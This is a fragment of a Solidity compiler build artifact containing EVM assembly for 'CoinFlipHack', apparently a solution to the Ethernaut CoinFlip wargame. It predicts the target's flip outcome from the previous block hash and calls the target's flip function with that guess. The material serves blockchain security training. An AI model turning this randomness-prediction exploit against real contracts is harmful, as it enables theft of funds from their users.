									"begin": -1,
									"end": -1,
									"name": "SUB",
									"source": -1
								},
								{
									"begin": 224,
									"end": 255,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 224,
									"end": 255,
									"name": "AND",
									"source": 1
								},
								{
									"begin": 214,
									"end": 256,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 214,
									"end": 256,
									"name": "EQ",
									"source": 1
								},
								{
									"begin": 204,
									"end": 274,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "10"
								},
								{
									"begin": 204,
									"end": 274,
									"name": "JUMPI",
									"source": 1
								},
								{
									"begin": 270,
									"end": 271,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 267,
									"end": 268,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 260,
									"end": 272,
									"name": "REVERT",
									"source": 1
								},
								{
									"begin": 204,
									"end": 274,
									"name": "tag",
									"source": 1,
									"value": "10"
								},
								{
									"begin": 204,
									"end": 274,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 293,
									"end": 298,
									"name": "SWAP4",
									"source": 1
								},
								{
									"begin": 14,
									"end": 304,
									"name": "SWAP3",
									"source": 1
								},
								{
									"begin": -1,
									"end": -1,
									"name": "POP",
									"source": -1
								},
								{
									"begin": -1,
									"end": -1,
									"name": "POP",
									"source": -1
								},
								{
									"begin": -1,
									"end": -1,
									"name": "POP",
									"source": -1
								},
								{
									"begin": 14,
									"end": 304,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 14,
									"end": 304,
									"name": "tag",
									"source": 1,
									"value": "7"
								},
								{
									"begin": 14,
									"end": 304,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 140,
									"end": 765,
									"name": "PUSH #[$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 140,
									"end": 765,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 140,
									"end": 765,
									"name": "PUSH [$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 140,
									"end": 765,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 140,
									"end": 765,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 140,
									"end": 765,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 140,
									"end": 765,
									"name": "RETURN",
									"source": 0
								}
							],
							".data": {
								"0": {
									".auxdata": "a2646970667358221220a1b2bdeac39cf64cb37fc77ae4da0b6b79487347dd5ad7c15ecc72ff72ca47ba64736f6c63430008120033",
									".code": [
										{
											"begin": 140,
											"end": 765,
											"name": "PUSH",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 140,
											"end": 765,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 140,
											"end": 765,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 140,
											"end": 765,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 140,
											"end": 765,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 140,
											"end": 765,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 140,
											"end": 765,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 140,
											"end": 765,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 140,
											"end": 765,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 140,
											"end": 765,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 140,
											"end": 765,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 140,
											"end": 765,
											"name": "tag",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 140,
											"end": 765,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 140,
											"end": 765,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 140,
											"end": 765,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 140,
											"end": 765,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 140,
											"end": 765,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 140,
											"end": 765,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 140,
											"end": 765,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 140,
											"end": 765,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 140,
											"end": 765,
											"name": "CALLDATALOAD",
											"source": 0
										},
										{
											"begin": 140,
											"end": 765,
											"name": "PUSH",
											"source": 0,
											"value": "E0"
										},
										{
											"begin": 140,
											"end": 765,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 140,
											"end": 765,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 140,
											"end": 765,
											"name": "PUSH",
											"source": 0,
											"value": "CB80C044"
										},
										{
											"begin": 140,
											"end": 765,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 140,
											"end": 765,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 140,
											"end": 765,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 140,
											"end": 765,
											"name": "tag",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 140,
											"end": 765,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 140,
											"end": 765,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 140,
											"end": 765,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 140,
											"end": 765,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 418,
											"end": 763,
											"name": "tag",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 418,
											"end": 763,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 418,
											"end": 763,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 418,
											"end": 763,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 418,
											"end": 763,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 418,
											"end": 763,
											"name": "tag",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 418,
											"end": 763,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 418,
											"end": 763,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 418,
											"end": 763,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 179,
											"end": 193,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 179,
											"end": 193,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 172,
											"end": 194,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 154,
											"end": 195,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 154,
											"end": 195,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 142,
											"end": 144,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 127,
											"end": 145,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 418,
											"end": 763,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 418,
											"end": 763,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 418,
											"end": 763,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 418,
											"end": 763,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 418,
											"end": 763,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 418,
											"end": 763,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 418,
											"end": 763,
											"name": "RETURN",
											"source": 0
										},
										{
											"begin": 418,
											"end": 763,
											"name": "tag",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 418,
											"end": 763,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 455,
											"end": 459,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 455,
											"end": 459,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 509,
											"end": 525,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 524,
											"end": 525,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 509,
											"end": 521,
											"name": "NUMBER",
											"source": 0
										},
										{
											"begin": 509,
											"end": 525,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 509,
											"end": 525,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 509,
											"end": 525,
											"name": "tag",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 509,
											"end": 525,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 499,
											"end": 526,
											"name": "BLOCKHASH",
											"source": 0
										},
										{
											"begin": 491,
											"end": 527,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 491,
											"end": 527,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 470,
											"end": 527,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 470,
											"end": 527,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 554,
											"end": 564,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 542,
											"end": 550,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 542,
											"end": 550,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 542,
											"end": 564,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 538,
											"end": 599,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 538,
											"end": 599,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 580,
											"end": 588,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 580,
											"end": 588,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 580,
											"end": 588,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 538,
											"end": 599,
											"name": "tag",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 538,
											"end": 599,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 605,
											"end": 613,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 605,
											"end": 626,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 605,
											"end": 626,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 605,
											"end": 626,
											"name": "SSTORE",
											"source": 0
										},
										{
											"begin": 664,
											"end": 670,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 664,
											"end": 670,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 651,
											"end": 670,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 651,
											"end": 670,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 616,
											"end": 626,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 651,
											"end": 670,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 651,
											"end": 670,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 651,
											"end": 670,
											"name": "tag",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 651,
											"end": 670,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 632,
											"end": 670,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 632,
											"end": 670,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 676,
											"end": 685,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 688,
											"end": 696,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 700,
											"end": 701,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 688,
											"end": 701,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 688,
											"end": 716,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "14"
										},
										{
											"begin": 688,
											"end": 716,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 711,
											"end": 716,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 688,
											"end": 716,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 688,
											"end": 716,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 688,
											"end": 716,
											"name": "tag",
											"source": 0,
											"value": "14"
										},
										{
											"begin": 688,
											"end": 716,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 704,
											"end": 708,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 688,
											"end": 716,
											"name": "tag",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 688,
											"end": 716,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 729,
											"end": 745,
											"name": "PUSH",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 729,
											"end": 745,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 729,
											"end": 756,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 729,
											"end": 756,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1D263F67"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": 729,
											"end": 756,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 729,
											"end": 756,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 179,
											"end": 193,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 179,
											"end": 193,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 172,
											"end": 194,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 729,
											"end": 756,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 729,
											"end": 756,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 729,
											"end": 756,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 154,
											"end": 195,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 676,
											"end": 716,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 676,
											"end": 716,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 729,
											"end": 745,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 729,
											"end": 745,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 729,
											"end": 750,
											"name": "PUSH",
											"source": 0,
											"value": "1D263F67"
										},
										{
											"begin": 729,
											"end": 750,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 127,
											"end": 145,
											"name": "PUSH",
											"source": 1,
											"value": "24"
										},
										{
											"begin": 127,
											"end": 145,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 729,
											"end": 756,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 729,
											"end": 756,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 729,
											"end": 756,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 729,
											"end": 756,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 729,
											"end": 756,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 729,
											"end": 756,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 729,
											"end": 756,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 729,
											"end": 756,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 729,
											"end": 756,
											"name": "DUP8",
											"source": 0
										},
										{
											"begin": 729,
											"end": 756,
											"name": "GAS",
											"source": 0
										},
										{
											"begin": 729,
											"end": 756,
											"name": "CALL",
											"source": 0
										},
										{
											"begin": 729,
											"end": 756,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 729,
											"end": 756,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 729,
											"end": 756,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 729,
											"end": 756,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "18"
										},
										{
											"begin": 729,
											"end": 756,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 729,
											"end": 756,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 729,
											"end": 756,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 729,
											"end": 756,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 729,
											"end": 756,
											"name": "RETURNDATACOPY",
											"source": 0
										},
										{
											"begin": 729,
											"end": 756,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 729,
											"end": 756,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 729,
											"end": 756,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 729,
											"end": 756,
											"name": "tag",
											"source": 0,
											"value": "18"
										},
										{
											"begin": 729,
											"end": 756,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 729,
											"end": 756,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 729,
											"end": 756,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 729,
											"end": 756,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 729,
											"end": 756,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 729,
											"end": 756,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 729,
											"end": 756,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 729,
											"end": 756,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 729,
											"end": 756,
											"name": "PUSH",
											"source": 0,
											"value": "1F"
										},
										{
											"begin": 729,
											"end": 756,
											"name": "NOT",
											"source": 0
										},
										{
											"begin": 729,
											"end": 756,
											"name": "PUSH",
											"source": 0,
											"value": "1F"
										},
										{
											"begin": 729,
											"end": 756,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 729,
											"end": 756,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 729,
											"end": 756,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 729,
											"end": 756,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 729,
											"end": 756,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 729,
											"end": 756,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 729,
											"end": 756,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 729,
											"end": 756,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 729,
											"end": 756,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 729,
											"end": 756,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 729,
											"end": 756,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 729,
											"end": 756,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 729,
											"end": 756,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "19"
										},
										{
											"begin": 729,
											"end": 756,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 729,
											"end": 756,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 729,
											"end": 756,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 729,
											"end": 756,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 729,
											"end": 756,
											"name": "tag",
											"source": 0,
											"value": "19"
										},
										{
											"begin": 729,
											"end": 756,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 722,
											"end": 756,
											"name": "SWAP4",
											"source": 0
										},
										{
											"begin": 722,
											"end": 756,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 722,
											"end": 756,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 722,
											"end": 756,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 722,
											"end": 756,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 418,
											"end": 763,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 418,
											"end": 763,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 206,
											"end": 431,
											"name": "tag",
											"source": 1,
											"value": "10"
										},
										{
											"begin": 206,
											"end": 431,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 273,
											"end": 282,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 273,
											"end": 282,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 273,
											"end": 282,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 294,
											"end": 305,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 294,
											"end": 305,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 294,
											"end": 305,
											"name": "GT",
											"source": 1
										},
										{
											"begin": 291,
											"end": 425,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 291,
											"end": 425,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "24"
										},
										{
											"begin": 291,
											"end": 425,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 347,
											"end": 357,
											"name": "PUSH",
											"source": 1,
											"value": "4E487B71"
										},
										{
											"begin": 342,
											"end": 345,
											"name": "PUSH",
											"source": 1,
											"value": "E0"
										},
										{
											"begin": 338,
											"end": 358,
											"name": "SHL",
											"source": 1
										},
										{
											"begin": 335,
											"end": 336,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 328,
											"end": 359,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 382,
											"end": 386,
											"name": "PUSH",
											"source": 1,
											"value": "11"
										},
										{
											"begin": 379,
											"end": 380,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 372,
											"end": 387,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 410,
											"end": 414,
											"name": "PUSH",
											"source": 1,
											"value": "24"
										},
										{
											"begin": 407,
											"end": 408,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 400,
											"end": 415,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 291,
											"end": 425,
											"name": "tag",
											"source": 1,
											"value": "24"
										},
										{
											"begin": 291,
											"end": 425,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 206,
											"end": 431,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 206,
											"end": 431,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 206,
											"end": 431,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 206,
											"end": 431,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 206,
											"end": 431,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 436,
											"end": 653,
											"name": "tag",
											"source": 1,
											"value": "13"
										},
										{
											"begin": 436,
											"end": 653,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 476,
											"end": 477,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 502,
											"end": 503,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 492,
											"end": 624,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "26"
										},
										{
											"begin": 492,
											"end": 624,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 546,
											"end": 556,
											"name": "PUSH",
											"source": 1,
											"value": "4E487B71"
										},
										{
											"begin": 541,
											"end": 544,
											"name": "PUSH",
											"source": 1,
											"value": "E0"
										},
										{
											"begin": 537,
											"end": 557,
											"name": "SHL",
											"source": 1
										},
										{
											"begin": 534,
											"end": 535,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 527,
											"end": 558,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 581,
											"end": 585,
											"name": "PUSH",
											"source": 1,
											"value": "12"
										},
										{
											"begin": 578,
											"end": 579,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 571,
											"end": 586,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 609,
											"end": 613,
											"name": "PUSH",
											"source": 1,
											"value": "24"
										},
										{
											"begin": 606,
											"end": 607,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 599,
											"end": 614,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 492,
											"end": 624,
											"name": "tag",
											"source": 1,
											"value": "26"
										},
										{
											"begin": 492,
											"end": 624,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 638,
											"end": 647,
											"name": "DIV",
											"source": 1
										},
										{
											"begin": 638,
											"end": 647,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 436,
											"end": 653,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 658,
											"end": 935,
											"name": "tag",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 658,
											"end": 935,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 725,
											"end": 731,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 778,
											"end": 780,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 766,
											"end": 775,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 757,
											"end": 764,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 753,
											"end": 776,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 749,
											"end": 781,
											"name": "SLT",
											"source": 1
										},
										{
											"begin": 746,
											"end": 798,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 746,
											"end": 798,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "28"
										},
										{
											"begin": 746,
											"end": 798,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 794,
											"end": 795,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 791,
											"end": 792,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 784,
											"end": 796,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 746,
											"end": 798,
											"name": "tag",
											"source": 1,
											"value": "28"
										},
										{
											"begin": 746,
											"end": 798,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 826,
											"end": 835,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 820,
											"end": 836,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 879,
											"end": 884,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 872,
											"end": 885,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 865,
											"end": 886,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 858,
											"end": 863,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 855,
											"end": 887,
											"name": "EQ",
											"source": 1
										},
										{
											"begin": 845,
											"end": 905,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "29"
										},
										{
											"begin": 845,
											"end": 905,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 901,
											"end": 902,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 898,
											"end": 899,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 891,
											"end": 903,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 845,
											"end": 905,
											"name": "tag",
											"source": 1,
											"value": "29"
										},
										{
											"begin": 845,
											"end": 905,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 924,
											"end": 929,
											"name": "SWAP4",
											"source": 1
										},
										{
											"begin": 658,
											"end": 935,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 658,
											"end": 935,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										}
									]
								}
							},
							"sourceList": [
								"ethernaut/CoinFlipHack.sol",
								"#utility.yul"
							]
						},
						"methodIdentifiers": {
							"flipHack()": "cb80c044"
						}
					},
